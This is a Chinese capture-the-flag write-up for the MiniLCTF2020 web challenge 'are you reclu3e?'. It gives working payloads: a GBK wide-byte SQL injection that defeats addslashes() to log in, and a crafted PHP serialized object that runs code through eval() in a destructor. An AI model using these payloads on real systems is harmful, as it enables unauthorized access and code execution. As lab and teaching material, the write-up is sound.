# MiniLCTF2020 - are you reclu3e?

## 题目简述

通过遗留的 Vim swap 文件可以恢复 `login.php` 与 `index.php`。登录阶段是 GBK 环境下 `addslashes()` 保护的 SQL 查询，可做宽字节注入；登录后又对 GET 参数直接 `unserialize()`，`person::__destruct()` 把私有属性插进双引号字符串后交给 `eval()`。

## 解题过程

恢复源码后可见数据库连接执行了：

```php
mysqli_query($conn, "SET CHARACTER SET 'gbk'");
$username = addslashes($_POST['username']);
$sql = "select * from users where username='$username'";
```

GBK 会把 `%df` 与 `addslashes()` 插入的反斜杠字节 `0x5c` 合成一个双字节字符，使随后单引号重新获得语法意义。无需完整盲注密码，构造一行并令第二列等于提交的密码即可登录：

```http
username=reclu3e%df%27%20union%20select%201,2%23&password=2
```

登录后，`index.php` 执行：

```php
$p = unserialize($_GET['p']);
@eval('$s="'.$this->serialize.'";');
```

私有属性在序列化串中的真实名字是 `\0person\0serialize`，两侧 NUL 必须 URL 编码为 `%00`。把属性值设为：

```php
${print($GLOBALS['flag'])}
```

一个对应的对象骨架为：

```text
O:6:"person":5:{s:4:"name";s:0:"";s:3:"age";i:0;s:6:"weight";i:0;s:6:"height";i:0;s:17:"%00person%00serialize";s:26:"${print($GLOBALS[%27flag%27])}";}
```

析构时双引号字符串发生插值，`print()` 从超全局数组中输出 `$flag`。也可以通过闭合引号调用 `highlight_file('flag.php')`，但要重新计算序列化字符串长度并完整 URL 编码。

## 方法总结

宽字节注入成立需要同时满足客户端字节不被二次编码、数据库连接使用兼容多字节字符集、转义函数只插入反斜杠。PHP 私有属性的 NUL 前缀和 `s:<长度>` 都是载荷的一部分，构造后应按原始字节而不是肉眼字符数复核。
